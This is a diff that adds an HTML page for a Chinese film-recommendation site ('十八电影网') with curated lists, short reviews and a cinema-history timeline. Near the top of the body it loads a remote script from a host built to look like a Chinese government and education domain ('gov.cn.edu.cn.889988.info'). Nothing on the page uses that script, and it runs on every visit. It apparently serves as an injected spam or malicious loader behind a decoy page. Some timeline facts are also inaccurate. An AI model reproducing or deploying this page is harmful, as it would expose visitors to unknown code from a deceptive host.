@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>十八电影网 - 十八岁该看的电影，永远十八岁的心态 | shibadianyingwang-h5.github.io</title>
+<meta name="description" content="十八电影网（https://shibadianyingwang-h5.github.io）精选18岁必看经典电影、青春成长、独立制片、先锋短片、影史里程碑与深夜食堂影评，致敬永远十八岁的观影灵魂。">
+<meta name="keywords" content="十八电影网,18岁电影,青春电影,独立电影,经典必看,深夜影评,shibadianyingwang-h5.github.io">
+<meta property="og:title" content="十八电影网 - 十八岁该看的电影，永远十八岁的心态">
+<meta property="og:description" content="18岁必看经典、青春成长、独立制片、先锋短片、影史里程碑、深夜食堂影评，致敬永远十八岁的观影灵魂。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://shibadianyingwang-h5.github.io">
+<link rel="canonical" href="https://shibadianyingwang-h5.github.io">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --void:#0a0a0f;--deep:#12121a;--panel:#1a1a26;--gold:#d4a843;--gold2:#f0c040;
+  --amber:#ff8c00;--amber2:#ff6a00;--neon:#ff2a4b;--text:#e8dcc8;--text2:#a89b82;
+  --line:rgba(212,168,67,0.25);--shadow:0 0 30px rgba(212,168,67,0.15);
+}
+html{scroll-behavior:smooth;font-size:16px}
+body{
+  font-family:'Noto Serif SC','PingFang SC','Microsoft YaHei',serif;
+  background:var(--void);color:var(--text);line-height:1.7;overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit}ul{list-style:none}
+
+/* 胶片颗粒背景 */
+body::before{
+  content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
+}
+
+/* header */
+.site-header{
+  position:fixed;top:0;left:0;right:0;z-index:1000;
+  background:rgba(10,10,15,0.92);backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--line);transition:all 0.3s;
+}
+.nav-container{
+  max-width:1200px;margin:0 auto;padding:0 1rem;
+  display:flex;align-items:center;justify-content:space-between;height:60px;
+}
+.logo{font-size:1.4rem;font-weight:900;color:var(--text);letter-spacing:3px}
+.logo span{color:var(--gold)}
+.nav-links{display:flex;gap:0.2rem}
+.nav-links a{
+  padding:0.35rem 0.7rem;border-radius:4px;font-size:0.82rem;font-weight:600;
+  transition:all 0.3s;color:var(--text2);letter-spacing:1px;
+  border:1px solid transparent;
+}
+.nav-links a:hover,.nav-links a.active{
+  background:rgba(212,168,67,0.1);color:var(--gold);border-color:var(--gold);
+  box-shadow:0 0 15px rgba(212,168,67,0.25);
+}
+.mobile-toggle{display:none;flex-direction:column;gap:4px;cursor:pointer}
+.mobile-toggle span{width:22px;height:2px;background:var(--gold);transition:0.3s}
+
+.main-content{position:relative;z-index:1;padding-top:60px}
+
+/* hero */
+.hero{
+  min-height:85vh;display:flex;align-items:center;justify-content:center;text-align:center;
+  background:
+    radial-gradient(ellipse 60% 50% at 50% 50%,rgba(212,168,67,0.08),transparent),
+    radial-gradient(ellipse 40% 30% at 80% 20%,rgba(255,140,0,0.06),transparent);
+  position:relative;overflow:hidden;
+}
+.hero::before{
+  content:'';position:absolute;inset:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(212,168,67,0.03) 2px,rgba(212,168,67,0.03) 4px);
+  animation:scan 8s linear infinite;
+}
+@keyframes scan{0%{transform:translateY(0)}100%{transform:translateY(4px)}}
+.hero-content{max-width:700px;padding:2rem 1rem;position:relative}
+.hero-badge{
+  display:inline-block;padding:0.4rem 1rem;border:1px solid var(--gold);border-radius:999px;
+  color:var(--gold);font-size:0.75rem;letter-spacing:2px;text-transform:uppercase;margin-bottom:1.5rem;
+  animation:glow 2s ease-in-out infinite alternate;
+}
+@keyframes glow{from{box-shadow:0 0 5px rgba(212,168,67,0.2)}to{box-shadow:0 0 20px rgba(212,168,67,0.5)}}
+.hero h1{font-size:clamp(2.2rem,6vw,4rem);line-height:1.1;font-weight:900;margin-bottom:1rem;letter-spacing:2px}
+.hero h1 em{font-style:normal;color:var(--gold)}
+.hero p{font-size:1rem;color:var(--text2);max-width:520px;margin:0 auto 2rem}
+.hero-cta{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap}
+.btn{
+  padding:0.7rem 1.8rem;border-radius:6px;font-size:0.85rem;font-weight:700;letter-spacing:1px;
+  transition:all 0.3s;cursor:pointer;border:1px solid var(--gold);
+}
+.btn-primary{background:var(--gold);color:var(--void)}
+.btn-primary:hover{background:var(--gold2);box-shadow:0 0 25px rgba(212,168,67,0.4)}
+.btn-outline{background:transparent;color:var(--gold)}
+.btn-outline:hover{background:rgba(212,168,67,0.1)}
+
+.section{padding:4rem 1rem;max-width:1200px;margin:0 auto}
+.section-header{text-align:center;margin-bottom:3rem}
+.section-header h2{font-size:1.8rem;font-weight:900;color:var(--text);margin-bottom:0.5rem;letter-spacing:3px}
+.section-header h2 i{color:var(--gold)}
+.section-header p{color:var(--text2);font-size:0.85rem;letter-spacing:2px}
+
+/* 栏目一：霓虹灯牌（18岁必看） */
+.neon-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:1.2rem}
+.neon-card{
+  background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:1.5rem 1.2rem;
+  text-align:center;position:relative;overflow:hidden;cursor:pointer;
+  opacity:0;transform:translateY(20px);transition:all 0.5s;
+}
+.neon-card.visible{opacity:1;transform:translateY(0)}
+.neon-card:hover{transform:translateY(-5px);border-color:var(--gold);box-shadow:0 0 25px rgba(212,168,67,0.2)}
+.neon-card .neon-num{
+  font-size:3rem;font-weight:900;color:transparent;-webkit-text-stroke:1px var(--gold);
+  margin-bottom:0.5rem;font-family:monospace;
+}
+.neon-card:hover .neon-num{
+  color:var(--gold);text-shadow:0 0 15px var(--gold),0 0 30px var(--gold);
+  -webkit-text-stroke:0;
+}
+.neon-card h3{font-size:0.95rem;margin-bottom:0.4rem;color:var(--text)}
+.neon-card p{font-size:0.75rem;color:var(--text2);margin-bottom:0.8rem}
+.neon-card .year{
+  display:inline-block;padding:0.2rem 0.6rem;background:rgba(212,168,67,0.1);
+  color:var(--gold);font-size:0.7rem;border-radius:3px;border:1px solid var(--line);
+}
+
+/* 栏目二：暗房显影（经典回顾） */
+.darkroom{max-width:900px;margin:0 auto}
+.develop{
+  display:flex;gap:1.5rem;align-items:center;padding:1.5rem;background:var(--panel);
+  border:1px solid var(--line);border-radius:12px;margin-bottom:1.2rem;
+  opacity:0;transform:translateX(-30px);transition:all 0.6s;position:relative;overflow:hidden;
+}
+.develop.visible{opacity:1;transform:translateX(0)}
+.develop::after{
+  content:'';position:absolute;inset:0;background:linear-gradient(90deg,transparent,rgba(212,168,67,0.05),transparent);
+  transform:translateX(-100%);transition:transform 0.8s;
+}
+.develop.visible::after{transform:translateX(100%)}
+.develop .film-strip{
+  width:80px;height:80px;flex-shrink:0;border-radius:8px;display:grid;place-items:center;
+  background:linear-gradient(135deg,var(--gold),var(--amber));
+  font-size:1.8rem;font-weight:900;color:var(--void);
+}
+.develop .info{flex:1}
+.develop h4{font-size:1rem;margin-bottom:0.3rem;color:var(--text)}
+.develop p{font-size:0.8rem;color:var(--text2);line-height:1.5}
+.develop .age-tag{
+  position:absolute;top:1rem;right:1rem;padding:0.3rem 0.7rem;
+  background:var(--void);border:1px solid var(--neon);color:var(--neon);
+  font-size:0.65rem;border-radius:3px;font-weight:700;
+}
+
+/* 栏目三：黑胶唱片（独立制片） */
+.vinyl-row{display:flex;gap:1.2rem;overflow-x:auto;padding:0.5rem 0 2rem;scroll-snap-type:x mandatory}
+.vinyl-row::-webkit-scrollbar{height:6px}
+.vinyl-row::-webkit-scrollbar-thumb{background:var(--line);border-radius:6px}
+.vinyl{
+  flex:0 0 220px;scroll-snap-align:start;background:var(--panel);border:1px solid var(--line);
+  border-radius:16px;padding:1.2rem;text-align:center;cursor:pointer;
+  opacity:0;transform:scale(0.9);transition:all 0.5s;position:relative;
+}
+.vinyl.visible{opacity:1;transform:scale(1)}
+.vinyl:hover{transform:scale(1.05);border-color:var(--gold);box-shadow:0 0 20px rgba(212,168,67,0.2)}
+.vinyl .disc{
+  width:100px;height:100px;border-radius:50%;margin:0 auto 1rem;
+  background:conic-gradient(from 0deg,var(--deep),var(--gold),var(--deep),var(--gold),var(--deep));
+  display:grid;place-items:center;position:relative;animation:spin 10s linear infinite paused;
+}
+.vinyl:hover .disc{animation-play-state:running}
+@keyframes spin{to{transform:rotate(360deg)}}
+.vinyl .disc::after{
+  content:'';width:30px;height:30px;border-radius:50%;background:var(--void);border:2px solid var(--gold);
+}
+.vinyl h4{font-size:0.9rem;margin-bottom:0.3rem;color:var(--text)}
+.vinyl p{font-size:0.72rem;color:var(--text2)}
+.vinyl .genre{
+  margin-top:0.8rem;display:inline-block;padding:0.2rem 0.6rem;
+  background:rgba(255,140,0,0.1);color:var(--amber);font-size:0.65rem;border-radius:3px;border:1px solid rgba(255,140,0,0.3);
+}
+
+/* 栏目四：先锋实验（短片集） */
+.lab-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:1.2rem}
+.lab-item{
+  background:var(--panel);border:1px solid var(--line);border-radius:12px;overflow:hidden;
+  opacity:0;transform:translateY(20px);transition:all 0.5s;cursor:pointer;
+}
+.lab-item.visible{opacity:1;transform:translateY(0)}
+.lab-item:hover{border-color:var(--neon);box-shadow:0 0 20px rgba(255,42,75,0.2)}
+.lab-item .lab-header{
+  padding:1rem 1.2rem;background:linear-gradient(90deg,rgba(255,42,75,0.1),transparent);
+  border-bottom:1px solid var(--line);display:flex;justify-content:space-between;align-items:center;
+}
+.lab-item .lab-id{font-family:monospace;color:var(--neon);font-size:0.7rem;font-weight:700}
+.lab-item .lab-body{padding:1.2rem}
+.lab-item h4{font-size:0.95rem;margin-bottom:0.4rem;color:var(--text)}
+.lab-item p{font-size:0.75rem;color:var(--text2);margin-bottom:0.8rem}
+.lab-item .duration{
+  display:inline-flex;align-items:center;gap:0.3rem;color:var(--text2);font-size:0.7rem;
+}
+.lab-item .duration::before{content:'▶';color:var(--neon);font-size:0.6rem}
+
+/* 栏目五：深夜食堂（影评） */
+.diner{max-width:800px;margin:0 auto}
+.menu-item{
+  display:flex;gap:1.2rem;padding:1.2rem;background:var(--panel);border:1px solid var(--line);
+  border-radius:12px;margin-bottom:1rem;opacity:0;transform:translateX(30px);transition:all 0.5s;
+}
+.menu-item.visible{opacity:1;transform:translateX(0)}
+.menu-item:hover{border-color:var(--amber);box-shadow:0 0 15px rgba(255,140,0,0.15)}
+.menu-item .dish{
+  width:50px;height:50px;border-radius:8px;display:grid;place-items:center;font-size:1.5rem;flex-shrink:0;
+  background:rgba(255,140,0,0.1);border:1px solid rgba(255,140,0,0.3);
+}
+.menu-item .dish-info{flex:1}
+.menu-item h4{font-size:0.9rem;margin-bottom:0.3rem;color:var(--text)}
+.menu-item p{font-size:0.78rem;color:var(--text2);line-height:1.5}
+.menu-item .rating{display:flex;align-items:center;gap:0.3rem;margin-top:0.5rem}
+.menu-item .stars{color:var(--gold);font-size:0.8rem}
+.menu-item .rating-val{color:var(--amber);font-weight:700;font-size:0.8rem}
+
+/* 栏目六：时光机（里程碑） */
+.timeline{max-width:700px;margin:0 auto;position:relative}
+.timeline::before{
+  content:'';position:absolute;left:50%;top:0;bottom:0;width:2px;background:var(--line);transform:translateX(-50%);
+}
+.tl-item{
+  display:flex;align-items:center;gap:2rem;margin-bottom:2rem;opacity:0;transform:translateY(20px);transition:all 0.6s;
+}
+.tl-item.visible{opacity:1;transform:translateY(0)}
+.tl-item:nth-child(odd){flex-direction:row}
+.tl-item:nth-child(even){flex-direction:row-reverse}
+.tl-dot{
+  width:16px;height:16px;border-radius:50%;background:var(--gold);border:3px solid var(--void);
+  box-shadow:0 0 0 3px var(--gold),0 0 15px var(--gold);flex-shrink:0;position:relative;z-index:2;
+}
+.tl-content{
+  flex:1;padding:1rem 1.2rem;background:var(--panel);border:1px solid var(--line);border-radius:10px;
+}
+.tl-item:nth-child(odd) .tl-content{text-align:right}
+.tl-content h4{font-size:0.9rem;color:var(--text);margin-bottom:0.3rem}
+.tl-content p{font-size:0.75rem;color:var(--text2)}
+.tl-year{
+  position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);
+  background:var(--void);color:var(--gold);font-weight:900;font-size:0.8rem;font-family:monospace;
+  padding:0.2rem 0.5rem;border:1px solid var(--gold);border-radius:4px;z-index:3;
+}
+
+/* 页脚 */
+.site-footer{
+  background:var(--deep);padding:3rem 1rem 1.5rem;border-top:1px solid var(--line);text-align:center;position:relative;z-index:1;
+}
+.footer-content{max-width:1200px;margin:0 auto}
+.footer-logo{font-size:1.3rem;font-weight:900;color:var(--text);margin-bottom:1rem;letter-spacing:3px}
+.footer-logo span{color:var(--gold)}
+.footer-links{display:flex;flex-wrap:wrap;justify-content:center;gap:1.2rem;margin-bottom:1.5rem}
+.footer-links a{color:var(--text2);font-size:0.8rem;transition:color 0.3s}
+.footer-links a:hover{color:var(--gold)}
+.footer-bottom{padding-top:1.5rem;border-top:1px solid var(--line);color:var(--text2);font-size:0.75rem}
+.footer-bottom p{margin-bottom:0.3rem}
+
+@media(max-width:960px){
+  .neon-grid{grid-template-columns:repeat(3,1fr)}
+  .lab-grid{grid-template-columns:1fr}
+}
+@media(max-width:640px){
+  .nav-links{
+    position:fixed;top:60px;left:0;right:0;background:rgba(10,10,15,0.98);
+    flex-direction:column;padding:1rem;gap:0.4rem;
+    transform:translateY(-150%);transition:transform 0.4s;
+  }
+  .nav-links.open{transform:translateY(0)}
+  .mobile-toggle{display:flex}
+  .neon-grid{grid-template-columns:repeat(2,1fr)}
+  .develop{flex-direction:column;text-align:center}
+  .develop .film-strip{margin:0 auto}
+  .develop .age-tag{position:static;margin-top:0.5rem}
+  .timeline::before{left:20px}
+  .tl-item{flex-direction:row!important;gap:1rem}
+  .tl-dot{margin-left:12px}
+  .tl-year{left:20px;top:-10px;transform:translateX(-50%)}
+  .tl-item:nth-child(odd) .tl-content{text-align:left}
+}
+@media(max-width:420px){.neon-grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site-header" id="header">
+  <div class="nav-container">
+    <div class="logo">十八<span>电影网</span></div>
+    <nav class="nav-links" id="navLinks">
+      <a href="#must" class="active">18必看</a>
+      <a href="#classic">暗房经典</a>
+      <a href="#indie">黑胶独立</a>
+      <a href="#lab">先锋实验</a>
+      <a href="#diner">深夜影评</a>
+      <a href="#timeline">时光里程碑</a>
+    </nav>
+    <div class="mobile-toggle" id="mobileToggle"><span></span><span></span><span></span></div>
+  </div>
+</header>
+
+<main class="main-content">
+
+  <!-- Hero -->
+  <section class="hero" id="top">
+    <div class="hero-content">
+      <div class="hero-badge">🔞 18+ 电影文化站</div>
+      <h1>十八岁该看的电影<br><em>永远十八岁的心态</em></h1>
+      <p>十八电影网（shibadianyingwang-h5.github.io）精选18岁必看经典、青春成长、独立制片、先锋短片、影史里程碑与深夜食堂影评——致敬永远十八岁的观影灵魂。</p>
+      <div class="hero-cta">
+        <a href="#must" class="btn btn-primary">开始探索</a>
+        <a href="#diner" class="btn btn-outline">深夜影评</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目一：霓虹灯牌（18岁必看） -->
+  <section class="section" id="must">
+    <div class="section-header">
+      <h2><i>🔥</i> 18岁必看 · 霓虹灯牌</h2>
+      <p>EIGHTEEN MUST-WATCH · COMING OF AGE</p>
+    </div>
+    <div class="neon-grid">
+      <div class="neon-card">
+        <div class="neon-num">01</div>
+        <h3>天堂电影院</h3>
+        <p>每个人都要离开自己的故乡，才能找到自己的天堂</p>
+        <span class="year">1988 · 155min</span>
+      </div>
+      <div class="neon-card">
+        <div class="neon-num">02</div>
+        <h3>死亡诗社</h3>
+        <p>及时行乐——Carpe Diem，抓住每一天</p>
+        <span class="year">1989 · 128min</span>
+      </div>
+      <div class="neon-card">
+        <div class="neon-num">03</div>
+        <h3>搏击俱乐部</h3>
+        <p>你不是你的工作，你不是你的钱包，你不是你车里的东西</p>
+        <span class="year">1999 · 139min</span>
+      </div>
+      <div class="neon-card">
+        <div class="neon-num">04</div>
+        <h3>楚门的世界</h3>
+        <p>如果再也碰不到你，祝你早安、午安、晚安</p>
+        <span class="year">1998 · 103min</span>
+      </div>
+      <div class="neon-card">
+        <div class="neon-num">05</div>
+        <h3>阿甘正传</h3>
+        <p>生活就像一盒巧克力，你永远不知道下一颗是什么味道</p>
+        <span class="year">1994 · 142min</span>
+      </div>
+      <div class="neon-card">
+        <div class="neon-num">06</div>
+        <h3>心灵捕手</h3>
+        <p>不是你的错——一句台词改变一生</p>
+        <span class="year">1997 · 126min</span>
+      </div>
+      <div class="neon-card">
+        <div class="neon-num">07</div>
+        <h3>美国丽人</h3>
+        <p>在塑料袋飞舞的瞬间，你看到了什么？</p>
+        <span class="year">1999 · 122min</span>
+      </div>
+      <div class="neon-card">
+        <div class="neon-num">08</div>
+        <h3>飞越疯人院</h3>
+        <p>至少我试过了——自由从来不是免费的</p>
+        <span class="year">1975 · 133min</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：暗房显影（经典回顾） -->
+  <section class="section" id="classic">
+    <div class="section-header">
+      <h2><i>🎞️</i> 暗房显影 · 经典回顾</h2>
+      <p>DARKROOM DEVELOPING · CLASSIC REVIEW</p>
+    </div>
+    <div class="darkroom">
+      <div class="develop">
+        <div class="film-strip">18</div>
+        <div class="info">
+          <h4>教父 · 三部曲</h4>
+          <p>男人一生必看的黑帮史诗。从马龙·白兰度到阿尔·帕西诺，三代教父的传承与背叛，每一帧都是教科书级别的镜头语言。</p>
+        </div>
+        <div class="age-tag">18+ 经典</div>
+      </div>
+      <div class="develop">
+        <div class="film-strip">21</div>
+        <div class="info">
+          <h4>七宗罪</h4>
+          <p>大卫·芬奇的暗黑神作。暴食、贪婪、懒惰、嫉妒、骄傲、淫欲、愤怒——七种原罪，七桩命案，结局让人不寒而栗。</p>
+        </div>
+        <div class="age-tag">18+ 悬疑</div>
+      </div>
+      <div class="develop">
+        <div class="film-strip">25</div>
+        <div class="info">
+          <h4>低俗小说</h4>
+          <p>昆汀·塔伦蒂诺的非线性叙事巅峰。拳击手、黑帮、餐馆抢劫——碎片化的故事拼出一幅荒诞又真实的洛杉矶画卷。</p>
+        </div>
+        <div class="age-tag">18+ 犯罪</div>
+      </div>
+      <div class="develop">
+        <div class="film-strip">35</div>
+        <div class="info">
+          <h4>发条橙</h4>
+          <p>库布里克的反乌托邦经典。暴力美学的极致探讨，当自由意志被剥夺，人还是人吗？</p>
+        </div>
+        <div class="age-tag">18+ 科幻</div>
+      </div>
+      <div class="develop">
+        <div class="film-strip">40</div>
+        <div class="info">
+          <h4>出租车司机</h4>
+          <p>孤独是纽约的另一种语言。德尼罗的眼神，配乐中的萨克斯，一个越战老兵在霓虹灯下的自我救赎。</p>
+        </div>
+        <div class="age-tag">18+ 剧情</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三：黑胶唱片（独立制片） -->
+  <section class="section" id="indie">
+    <div class="section-header">
+      <h2><i>💿</i> 黑胶独立 · 独立制片</h2>
+      <p>VINYL INDEPENDENT · INDIE FILMS</p>
+    </div>
+    <div class="vinyl-row">
+      <div class="vinyl">
+        <div class="disc"></div>
+        <h4>月光男孩</h4>
+        <p>黑人男孩的成长与性向认同</p>
+        <span class="genre">独立 · 剧情</span>
+      </div>
+      <div class="vinyl">
+        <div class="disc"></div>
+        <h4>海边的曼彻斯特</h4>
+        <p>悲伤不是用来治愈的，是用来共处的</p>
+        <span class="genre">独立 · 家庭</span>
+      </div>
+      <div class="vinyl">
+        <div class="disc"></div>
+        <h4>伯德小姐</h4>
+        <p>母女关系、青春叛逆与自我发现</p>
+        <span class="genre">独立 · 青春</span>
+      </div>
+      <div class="vinyl">
+        <div class="disc"></div>
+        <h4>三块广告牌</h4>
+        <p>愤怒、复仇与意外的人性微光</p>
+        <span class="genre">独立 · 犯罪</span>
+      </div>
+      <div class="vinyl">
+        <div class="disc"></div>
+        <h4>水形物语</h4>
+        <p>哑女与两栖人的跨物种爱情童话</p>
+        <span class="genre">独立 · 奇幻</span>
+      </div>
+      <div class="vinyl">
+        <div class="disc"></div>
+        <h4>寄生虫</h4>
+        <p>贫富差距的黑色寓言，奥斯卡最佳影片</p>
+        <span class="genre">独立 · 惊悚</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：先锋实验（短片集） -->
+  <section class="section" id="lab">
+    <div class="section-header">
+      <h2><i>🧪</i> 先锋实验 · 短片集</h2>
+      <p>AVANT-GARDE LAB · SHORT FILMS</p>
+    </div>
+    <div class="lab-grid">
+      <div class="lab-item">
+        <div class="lab-header"><span class="lab-id">LAB-001</span><span class="duration">12:34</span></div>
+        <div class="lab-body">
+          <h4>沉默的房间</h4>
+          <p>一个没有声音的房间，一个人试图用肢体语言讲述自己的故事。实验性无声短片，探讨孤独的本质。</p>
+        </div>
+      </div>
+      <div class="lab-item">
+        <div class="lab-header"><span class="lab-id">LAB-002</span><span class="duration">08:17</span></div>
+        <div class="lab-body">
+          <h4>倒带的城市</h4>
+          <p>将城市监控录像倒放，创造出一种超现实的时空错位感。没有对白，只有画面和原声。</p>
+        </div>
+      </div>
+      <div class="lab-item">
+        <div class="lab-header"><span class="lab-id">LAB-003</span><span class="duration">15:42</span></div>
+        <div class="lab-body">
+          <h4>像素人生</h4>
+          <p>用8-bit像素动画讲述一个人的一生，从出生到死亡，每个阶段对应一种游戏类型。致敬电子游戏文化。</p>
+        </div>
+      </div>
+      <div class="lab-item">
+        <div class="lab-header"><span class="lab-id">LAB-004</span><span class="duration">06:55</span></div>
+        <div class="lab-body">
+          <h4>最后一帧</h4>
+          <p>一部电影的最后帧被无限放大，每一个像素都隐藏着一个故事。微观叙事实验短片。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：深夜食堂（影评） -->
+  <section class="section" id="diner">
+    <div class="section-header">
+      <h2><i>🍜</i> 深夜食堂 · 影评</h2>
+      <p>MIDNIGHT DINER · FILM REVIEWS</p>
+    </div>
+    <div class="diner">
+      <div class="menu-item">
+        <div class="dish">🍺</div>
+        <div class="dish-info">
+          <h4>为什么18岁要看《搏击俱乐部》？</h4>
+          <p>不是教你打架，是教你质疑消费主义。当你被社会规训成一个"合格的大人"之前，先看看这部电影——它会在你心里种下一颗炸弹。</p>
+          <div class="rating"><span class="stars">★★★★★</span><span class="rating-val">9.2</span></div>
+        </div>
+      </div>
+      <div class="menu-item">
+        <div class="dish">☕</div>
+        <div class="dish-info">
+          <h4>《天堂电影院》为什么让人哭？</h4>
+          <p>因为它讲的不只是电影，是离别。每个人生命里都有一个"艾佛特"，推着你离开，然后你再也回不去那个夏天。</p>
+          <div class="rating"><span class="stars">★★★★★</span><span class="rating-val">9.5</span></div>
+        </div>
+      </div>
+      <div class="menu-item">
+        <div class="dish">🥃</div>
+        <div class="dish-info">
+          <h4>独立电影为什么比大片更"真"？</h4>
+          <p>没有1亿美金的特效，但有1亿美金的诚意。独立电影拍的是"人"，不是"英雄"——它允许角色不完美、不成功、不快乐。</p>
+          <div class="rating"><span class="stars">★★★★☆</span><span class="rating-val">8.7</span></div>
+        </div>
+      </div>
+      <div class="menu-item">
+        <div class="dish">🍵</div>
+        <div class="dish-info">
+          <h4>18岁看不懂《发条橙》怎么办？</h4>
+          <p>看不懂就对了。库布里克拍的不是让你"懂"的，是让你"不舒服"的。那种不舒服，就是你开始思考的起点。</p>
+          <div class="rating"><span class="stars">★★★★☆</span><span class="rating-val">8.9</span></div>
+        </div>
+      </div>
+      <div class="menu-item">
+        <div class="dish">🍶</div>
+        <div class="dish-info">
+          <h4>深夜为什么适合看文艺片？</h4>
+          <p>因为白天你要装作"正常"。深夜才是你自己的时间——文艺片不催你，它陪你慢慢沉下去，再慢慢浮上来。</p>
+          <div class="rating"><span class="stars">★★★★★</span><span class="rating-val">9.0</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目六：时光机（里程碑） -->
+  <section class="section" id="timeline">
+    <div class="section-header">
+      <h2><i>⏰</i> 时光里程碑</h2>
+      <p>TIME MACHINE · MILESTONES</p>
+    </div>
+    <div class="timeline">
+      <div class="tl-item">
+        <div class="tl-dot"></div>
+        <div class="tl-content">
+          <h4>1895 · 电影诞生</h4>
+          <p>卢米埃尔兄弟在巴黎咖啡馆首次公开放映《火车进站》，人类第一次在银幕上看到"活"的画面。</p>
+        </div>
+        <div class="tl-year">1895</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot"></div>
+        <div class="tl-content">
+          <h4>1927 · 有声时代</h4>
+          <p>《爵士歌王》上映，电影从默片时代跨入有声时代，彻底改变了电影语言。</p>
+        </div>
+        <div class="tl-year">1927</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot"></div>
+        <div class="tl-content">
+          <h4>1939 · 彩色黄金年</h4>
+          <p>《乱世佳人》和《绿野仙踪》同年上映，彩色电影技术走向成熟，好莱坞黄金时代达到顶峰。</p>
+        </div>
+        <div class="tl-year">1939</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot"></div>
+        <div class="tl-content">
+          <h4>1968 · 分级制度诞生</h4>
+          <p>MPAA电影分级制度实施，X级诞生——电影终于可以"成人化"，《午夜牛郎》成为第一部X级奥斯卡最佳影片。</p>
+        </div>
+        <div class="tl-year">1968</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot"></div>
+        <div class="tl-content">
+          <h4>1995 · 数字时代</h4>
+          <p>《玩具总动员》成为第一部全CG动画长片，皮克斯开启数字动画新纪元。</p>
+        </div>
+        <div class="tl-year">1995</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot"></div>
+        <div class="tl-content">
+          <h4>2020 · 流媒体革命</h4>
+          <p>疫情加速流媒体崛起，《无依之地》在流媒体平台首映并获金狮奖，电影发行模式永久改变。</p>
+        </div>
+        <div class="tl-year">2020</div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site-footer">
+  <div class="footer-content">
+    <div class="footer-logo">十八<span>电影网</span></div>
+    <div class="footer-links">
+      <a href="#must">18必看</a>
+      <a href="#classic">暗房经典</a>
+      <a href="#indie">黑胶独立</a>
+      <a href="#lab">先锋实验</a>
+      <a href="#diner">深夜影评</a>
+      <a href="#timeline">时光里程碑</a>
+      <a href="#">关于本站</a>
+      <a href="#">免责声明</a>
+    </div>
+    <div class="footer-bottom">
+      <p>网站名称：十八电影网 | 网站网址：https://shibadianyingwang-h5.github.io</p>
+      <p>精选18岁必看经典电影、青春成长、独立制片、先锋短片、影史里程碑与深夜食堂影评。</p>
+      <p>© 2026 十八电影网 保留所有权利。单页演示，内页链接均以 # 占位。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+// 移动端菜单
+var mobileToggle=document.getElementById('mobileToggle');
+var navLinks=document.getElementById('navLinks');
+mobileToggle.addEventListener('click',function(){
+  navLinks.classList.toggle('open');
+  mobileToggle.classList.toggle('active');
+});
+navLinks.querySelectorAll('a').forEach(a=>a.addEventListener('click',()=>navLinks.classList.remove('open')));
+
+// 导航高亮
+var sections=document.querySelectorAll('.section, .hero');
+var navItems=document.querySelectorAll('.nav-links a');
+window.addEventListener('scroll',function(){
+  var scrollY=window.scrollY+80;
+  sections.forEach(function(sec){
+    var top=sec.offsetTop,height=sec.offsetHeight,id=sec.getAttribute('id');
+    if(scrollY>=top&&scrollY<top+height){
+      navItems.forEach(function(a){a.classList.remove('active');});
+      var active=document.querySelector('.nav-links a[href="#'+id+'"]');
+      if(active)active.classList.add('active');
+    }
+  });
+  var header=document.getElementById('header');
+  if(window.scrollY>50){header.style.boxShadow='0 2px 20px rgba(212,168,67,0.2)';}
+  else{header.style.boxShadow='none';}
+});
+
+// 滚动进入动画
+var observerOptions={threshold:0.1,rootMargin:'0px 0px -50px 0px'};
+var observer=new IntersectionObserver(function(entries){
+  entries.forEach(function(entry){
+    if(entry.isIntersecting){
+      entry.target.classList.add('visible');
+      observer.unobserve(entry.target);
+    }
+  });
+},observerOptions);
+document.querySelectorAll('.neon-card,.develop,.vinyl,.lab-item,.menu-item,.tl-item').forEach(function(el){observer.observe(el);});
+</script>
+
+</body>
+</html>
